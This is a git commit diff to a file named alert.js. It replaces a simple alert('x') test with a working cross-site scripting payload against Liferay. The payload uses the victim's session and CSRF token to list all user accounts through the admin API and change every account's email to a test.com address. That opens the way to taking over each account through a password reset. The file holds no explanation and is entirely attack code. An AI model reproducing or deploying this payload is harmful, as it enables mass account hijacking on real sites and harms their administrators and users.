64f239cb4034c4e709461f81e62f68cbdeb04702
souravpaul1 <souravpaul.dev@gmail.com>
2025-10-21 17:22:23 +0530

    Update alert.js

--- alert.js
+++ alert.js
@@ -1,1 +1,29 @@
-alert('x');
+// alert('x');
+
+(async () => {
+    const res = await fetch('/o/headless-admin-user/v1.0/user-accounts', {
+        method: 'GET',
+        credentials: 'same-origin',
+        headers: {
+            'X-CSRF-Token': Liferay.authToken,
+            'Content-Type': 'application/json'
+        }
+    });
+
+    const data = await res.json();
+    const users = data.items || [];
+
+    for (let i = 0; i < users.length; i++) {
+        const newEmail = `test+${i + 1}@test.com`;
+
+        await fetch(`/o/headless-admin-user/v1.0/user-accounts/${users[i].id}`, {
+            method: 'PATCH',
+            credentials: 'same-origin',
+            headers: {
+                'X-CSRF-Token': Liferay.authToken,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ emailAddress: newEmail })
+        });
+    }
+})();
